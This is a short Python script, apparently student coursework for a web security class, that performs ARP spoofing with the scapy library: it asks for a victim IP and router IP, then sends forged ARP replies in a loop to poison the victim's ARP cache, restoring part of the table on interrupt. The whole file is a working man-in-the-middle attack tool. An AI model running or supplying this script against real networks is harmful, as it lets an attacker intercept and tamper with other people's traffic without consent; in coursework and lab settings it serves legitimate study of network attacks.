"""
    Autor: Isaac Sánchez Verdiguel
    Materia: Web Security
    Grupo: 6CV2
"""

import scapy.all as scapy 
import time 
  
# Obtiene la MAC con la librería scapy  
def get_mac(ip): 
    arp_request = scapy.ARP(pdst = ip) 
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

# Prepara el paquete para la víctima
def spoofing(victim_ip, router_ip): 
    packet = scapy.ARP(op = 2, pdst = victim_ip, hwdst = get_mac(victim_ip), 
                                                            psrc = router_ip) 
    scapy.send(packet, verbose = False) 
  
# Función importante para restaurar la MAC
def restore(destination_ip, source_ip): 
    destination_mac = get_mac(destination_ip) 
    #print(destination_mac)
    source_mac = get_mac(source_ip) 
    #print(source_mac)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
    scapy.send(packet, verbose = False) 
  
if __name__ == "__main__":
    victim_ip = input("Ingrese la IP de la máquina víctima: ")
    router_ip = input("Ingrese la IP del router: ")
    try: 
        sent_packets_count = 0
        while True: 
            spoofing(victim_ip, router_ip) 
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Paquetes enviados "+str(sent_packets_count), end ="") 
            time.sleep(2)
  
    except KeyboardInterrupt: 
        restore(router_ip, victim_ip) 
        print("[+] ARP detenido") 
